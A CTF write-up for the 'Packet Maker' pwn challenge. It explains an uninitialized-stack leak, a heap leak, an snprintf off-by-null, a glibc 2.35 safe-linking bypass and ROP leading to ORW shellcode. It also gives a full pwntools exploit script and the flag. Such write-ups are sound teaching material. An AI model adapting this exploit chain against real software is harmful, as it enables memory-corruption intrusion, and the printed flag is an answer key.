# Packet Maker writeup

## Description

How long are you only going to use packets made by old people?

Make any packet you want!

`$ nc something.challenge.cr3c.tf 1337`

flag is at `/flag.txt`

**author**: brwook

## Code Inspection

There are three vulnerability on this binary. First one is uninitialized stack.

```c
typedef struct packet {
    unsigned long long size;
    unsigned long long checksum;
    struct packet *next;
    struct packet *prev;
    char data[0x68];
} note;

void addPacket() {
    unsigned long long size = 0;
    unsigned long long index = 0;
    char buf[0x88];

    ...

    printf("Packet > ");
    read(0, buf, size);
    newNote->size = size;
    newNote->data[snprintf(newNote->data, size, "%s:%s", protocolName[index], buf)] = '\0';

    ...

    printf("checksum : %p\n", newNote->checksum);
}
```

`buf` is not initialized, so dummy are copied into heap. Using it, we can leak libc, stack, pie. But, leak isn't that simple.

```c
uint32_t compute_checksum(note *n) {
    uint64_t checksum = 0;
    uint32_t *ptr = (uint32_t *)n;

    unsigned long long words = n->size / 4;
    for (unsigned long long i = 0; i < words + 8; i++) { // 8 (size, checksum, next, prev)
        checksum += ptr[i];
        if (checksum >= 0x100000000) {
            checksum &= 0xFFFFFFFF;
            checksum++;
        }
    }
    checksum = ~checksum + 1;
    return checksum;
}
```

The only thing that we can leak is 4-bytes checksum of our packet. So, we can leak only up to 4 bytes at once. If we use a single chunk, than next, prev is zero, so only packet data and size of packet affect checksum.

Second one is logic bug for leaking heap. The linking is done before calcuating checksum, so we can leak heap base.

Last one is sprintf oob write NULL.

```
    The functions snprintf() and vsnprintf() do not write more than  size  bytes  (including  the  terminating  null  byte
    ('\0')).   If the output was truncated due to this limit, then the return value is the number of characters (excluding
    the terminating null byte) which would have been written to the final string  if  enough  space  had  been  available.
```

It is a part of [man sprintf(3p)](https://man7.org/linux/man-pages/man3/snprintf.3p.html). Return value of snprintf is the number of characters which would have been written.

```c
newNote->data[snprintf(newNote->data, size, "%s:%s", protocolName[index], buf)] = '\0';
```

`newNote->data` is 68 bytes. If we use 15-bytes length protocol which we make, we can overwrite fd of next chunk with NULL(`'\0'`).

## Bypass Safe Linking

```python
pwndbg> x/40gx 0x5601e80186e0
0x5601e80186e0: 0x0000000000000000      0x0000000000000091      ###  <--- chunk which will be allocated
0x5601e80186f0: 0x00005604881f0798      0x8ff843998f60175e      # size, checksum
0x5601e8018700: 0x0000000000000000      0x00005601e8018660      # next, prev
0x5601e8018710: 0x0000000000000000      0x0000000000000000      # data[0x68]
0x5601e8018720: 0x0000000000000000      0x0000000000000000
0x5601e8018730: 0x0000000000000000      0x0000000000000000
0x5601e8018740: 0x0000000000000000      0x0000000000000000
0x5601e8018750: 0x0000000000000000      0x0000000000000000
0x5601e8018760: 0x0000000000000000      0x0000000000000000
0x5601e8018770: 0x0000000000000000      0x0000000000000091      ###  <--- next chunk
0x5601e8018780: 0x00005604881f0808      0x8ff843998f60175e      # fd
0x5601e8018790: 0x0000000000000000      0x00005601e80186f0
0x5601e80187a0: 0x0000000000000000      0x0000000000000000
0x5601e80187b0: 0x0000000000000000      0x0000000000000000
0x5601e80187c0: 0x0000000000000000      0x0000000000000000
0x5601e80187d0: 0x0000000000000000      0x0000000000000000
0x5601e80187e0: 0x0000000000000000      0x0000000000000000
0x5601e80187f0: 0x0000000000000000      0x0000000000000000
0x5601e8018800: 0x0000000000000000      0x0000000000000091
```

But as you can see above, the safe-linking mitigation is applied because the binary is based on glibc 2.35. To bypass it, there is a precondition about heap start address. Suppose that `... A B C D 0 0 0` is a start address of heap (each one is 4-bits). `A` should be equal with `D` and `B` should be 0. In safe-linking, the fd value is set like this:

```
    A B C D X 1 0   (next chunk address)
XOR       A B C D   (current chunk address >> 12)
-----------------
```

If `A` is same with `D`, then `A ^ D` is 0. Also, `X ^ B` is just `X` if `B` is zero. It means that if we overwrite second byte of fd with null, the fd will point at tcache_perthread_struct.

Before overwriting, the tcache entry is like this:

```python
pwndbg> bin
tcachebins
0x90 [  3]: 0x5601e80186f0 —▸ 0x5601e8018780 —▸ 0x5601e8018810 ◂— 0x0
```

After overwriting, the tcache entry is like this 😊:
```python
pwndbg> bin
tcachebins
0x90 [  2]: 0x5601e8018780 —▸ 0x5601e8018010 ◂— 0x5601e8018
```

However, I think that it is too ideal and close to winning the lottery. 

In fact, we can match `A` and `D` by allocating enormous packet chunks, right? So using it, we can do tcache dup into a few chunks located at the start of the page where `A` is equal with `D`.

After it, modify tcache->entry with tcahce_perthread_struct again and then we get same environment with previous one (winning the lottery). By using this way, we only requires that `B` is 0.

My target was `... A B C D 0 1 0` for allocating packet chunk once again by freeing tcache_perthread_struct chunk (0x290). The chunk will be at unsorted bin since whole tcache counts are more than 7 by packet data.

## ROP using stack pointer

So far, we made one protocol, and we can make two protocols more. Because both chunks are written by strlen(protocol -> strdup, packet -> snprintf) and seccomp is applied this binary, we have to do ROP anyway. And at least two allocation is needed for ROP.

```c
void hint() {
    puts("I have a gift for you in the main function! I hope it helps you a lot.");
}

int main() {
    unsigned long long present = &present;
    ...
}
```

I made a stack pointer at `main` function, and we can use it for ROP. By overwriting addProtocol RET with `pop rdi; pop rbp; ret` gadget and main SFP with `gets` function like this:

```python
pwndbg> tele 0x7fffe7209990
00:0000│ rdi 0x7fffe7209990 ◂— 0x4242424242424242 ('BBBBBBBB')
01:0008│ rsp 0x7fffe7209998 —▸ 0x7f718382a745 (__gconv_open+501) ◂— pop rdi
02:0010│     0x7fffe72099a0 ◂— 0x7fffe72099a0
03:0018│     0x7fffe72099a8 ◂— 0x5663ee390550e800
04:0020│     0x7fffe72099b0 —▸ 0x7f7183880520 (gets) ◂— endbr64 
05:0028│     0x7fffe72099b8 ◂— 0x0
06:0030│     0x7fffe72099c0 ◂— 0x0
07:0038│     0x7fffe72099c8 —▸ 0x5601e7a14d0a (main) ◂— endbr64 

pwndbg> x/3i 0x7f718382a745
   0x7f718382a745 <__GI___gconv_open+501>:      pop    rdi
   0x7f718382a746 <__GI___gconv_open+502>:      pop    rbp
   0x7f718382a747 <__GI___gconv_open+503>:      ret    
```

After it, we can do anything. We can solve with any ROP payload right now. There is a Seccomp mitigation against getting a shell, but it is not that big of a problem. Do ORW ROP.

## Solver.py

```py
from pwn import *
choice = lambda x: p.sendlineafter(b"> ", str(x).encode())
def addProtocol(name):
    choice(1)
    p.sendafter(b"> ", name)

def addPacket(size, index, packet):
    choice(2)
    choice(size)
    choice(index)
    p.sendafter(b"> ", packet)

def delPacket(index):
    choice(3)
    choice(index)

def calcChecksum():
    p.recvuntil(b": ")
    checksum = ((~int(p.recvline(), 16) + 1) & 0xFFFFFFFF)
    s = u32(b'DNS:') + sz
    for i in range(0, len(pl), 4):
        s += u32(pl[i:i+4].ljust(4, b'\x00'))
        if s > 0x100000000:
            s -= 0xFFFFFFFF

    result = checksum - s
    if result < 0:
        result += 0x100000000 - 1

    return result

def leak_8(offset=4):
    global sz, pl
    addPacket(sz, 2, pl)
    low = calcChecksum()
    if low == 0:
        return -1
    delPacket(0)

    sz += offset
    pl += b'\x01'* offset
    addPacket(sz, 2, pl)
    high = calcChecksum()
    delPacket(0)
    
    val = (high << 32) + low
    return val

context(arch='amd64')
# context.log_level = 'debug'

while True:
    if args.REMOTE:
        p = remote('localhost', 32769)
        libc = ELF('./libc.so.6', False)
    else:
        p = process('./packet-maker', aslr=1)
        libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', False)

    # 1. leak libc, pie, stack (uninitialized stack)
    pl = b'\x80'*0x1
    sz = len(pl) + 4 + 4    # 4(protocol length) + 4(3bytes to leak)
    libc.address = leak_8(3) + 0x80 - libc.sym._IO_2_1_stdout_

    pl = b'\x01'*0x10
    sz = len(pl) + 4 + 5    # 4(protocol length) + 5(4bytes to leak)
    pie = leak_8() - 0x4020

    pl = b'\x01' * 0x40
    sz = len(pl) + 4 + 5    # 4(protocol length) + 5(4bytes to leak)
    stack = leak_8()
    if stack == -1:
        log.failure("stack leak failed")
        p.close()
        continue

    # 2. leak heap (using packet->prev and pie)
    addPacket(0x1, 1, b'\x00')
    addPacket(0x1, 1, b'\x00')
    p.recvuntil(b"checksum : ")
    checksum = ((~int(p.recvline(), 16) + 1) & 0xFFFFFFFF)
    heap = (checksum - (pie >> 32) - 1 - 0x300) | (pie & 0xFFFF00000000)
    if heap & 1 == 1:
        heap -= 1

    if heap & 0xFFF != 0:
        log.failure("heap leak failed")
        p.close()
        continue 
    
    # check heap address for exploit
    A = (heap >> 24) & 0xF
    B = (heap >> 20) & 0xF
    D = (heap >> 12) & 0xF
    if B != 0:
        log.failure("heap bruteforce failed")
        p.close()
        continue

    elif A == D:
        log.failure("heap bruteforce failed")
        p.close()
        continue

    log.success(f"pie base @ 0x{pie:x}")
    log.success(f"heap @ 0x{heap:x}")
    log.success(f"libc base @ 0x{libc.address:x}")
    log.success(f"stack @ 0x{stack:x}")
    
    # 3. allocate the chunks until A be equal with D
    top = heap + 0x380
    cnt = 1
    while A != D:
        addPacket(1, 1, b'\x00')
        cnt += 1
        top += 0x90
        D = (top >> 12) & 0xF
    
    # if B is set, try again
    target_chunk = top
    B = (top >> 20) & 0xF
    while ((target_chunk >> 8) & 0xF) != B:
        p.close()
        continue

    # 4. set target chunk which will prepare tcache->next as tcache_perthread_struct
    target_chunk = top
    target_chunk_data = (target_chunk + 0x20) & 0xFF
    target_chunk_cnt = cnt
    log.info(f"target chunk @ 0x{target_chunk:x}")

    # 5. allocate more chunks and find the safe place for tcache->next
    addPacket(0x68, 1, b'A'*8)
    addPacket(0x68, 1, b'A'*8)
    addPacket(0x68, 1, b'A'*8)
    top += 0x90 * 3
    cnt += 3
    log.info(f"top : 0x{top:x}")

    while True:
        top_data_fd = (top & 0xFF)
        if target_chunk_data <= top_data_fd and top_data_fd < target_chunk_data + 0x68:
            break

        top += 0x90
        cnt += 1
        addPacket(1, 1, b'1')
    
    offset = top_data_fd - target_chunk_data
    
    # 6. free target_chunk and prepare tcache->next
    delPacket(target_chunk_cnt)
    addPacket(0x68, 2, b'A'*(offset - 4) + p64((heap + 0x10) ^ (top >> 12)))
    
    # 7. overwrite tcache->next as target_chunk->data (oob write NULL)
    delPacket(0)
    delPacket(cnt - 2)
    delPacket(cnt - 3)
    delPacket(cnt - 4)
    addProtocol(b'A'*0xF)
    addPacket(0x68, 4, b'B'*0x61 + b'\x00')
    addPacket(1, 1, b'\x00')
    addPacket(1, 1, b'\x00')

    try:
        # 8. overwrite gets on main SFP
        addPacket(0x68, 4, b'B'*0x50 + p64(stack + 0x20)[:7])
        addProtocol(p64(libc.symbols['gets'])[:7])

        # 9. free tcache_perthread_struct chunk into unsorted bin (entry cnt is larger than 7)
        delPacket(cnt - 3)

        # 10. overwrite rdi, rbp gadget on addProtocol RET
        rop = ROP([libc])
        pop_rdi_rbp = rop.find_gadget(['pop rdi', 'pop rbp', 'ret'])[0]
        addPacket(0x68, 4, b'C'*0x50 + p64(stack)[:7])
        addProtocol(b'B'* 8 + p64(pop_rdi_rbp)[:7])
    except EOFError:
        p.close()
        continue

    if args.REMOTE:
        shell = shellcraft.open("/flag.txt")
    else:
        shell = shellcraft.open("./flag.txt")
    shell += shellcraft.read("rax", heap, 0x50)
    shell += shellcraft.write(1, heap, 0x50)

    # 11. write rop payload and shellcode for ORW
    rop.call("mprotect", [stack - (stack & 0xFFF), 0x2000, 7])
    payload = b'F' * 0x18
    payload += rop.chain()
    payload += p64(stack + 0x70) + asm(shell)
    p.sendline(payload)
    print(p.recvuntil(b"}"))

    break

p.close()
exit(0)
```

`cr3{U$e_5nPr1n7F_m4KES_0Ff_by_nU11_YOu_4RE_R3aL1y_g0$u!}`